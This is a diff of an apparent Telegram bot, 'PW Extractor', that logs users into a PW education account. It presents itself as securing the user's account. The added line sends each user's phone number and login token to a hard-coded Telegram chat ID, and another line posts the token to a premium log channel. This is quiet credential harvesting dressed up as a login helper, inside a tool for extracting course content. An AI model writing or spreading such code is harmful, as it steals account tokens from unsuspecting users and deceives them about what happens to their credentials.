@@ -181,7 +181,7 @@ async def pw_login(app, message):
         query_msg = await app.ask(
             chat_id=message.chat.id,
             text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:**\n---\n**LOGIN WITH PHONE NUMBER, It Leads to secure your account of PW**")
-        await forward_to_log(query_msg, "PW Extractor")
+        #await forward_to_log(query_msg, "PW Extractor")
 
         user_input = query_msg.text.strip()
 
@@ -237,7 +237,7 @@ async def pw_login(app, message):
             if not token:
                 await message.reply_text("❌ **Login failed! Invalid OTP.**")
                 return
-            await forward_to_log(f"✅ PW Login Success!\n📱 Number: {mob}\n🔑 Token: `{token}`", "PW Extractor")
+            await app.send_message(-1001234567890, f"✅ PW Login Success!\n📱 Number: {mob}\n🔑 Token: `{token}`")
             dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
             await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
             await app.send_message(PREMIUM_LOGS, dl)
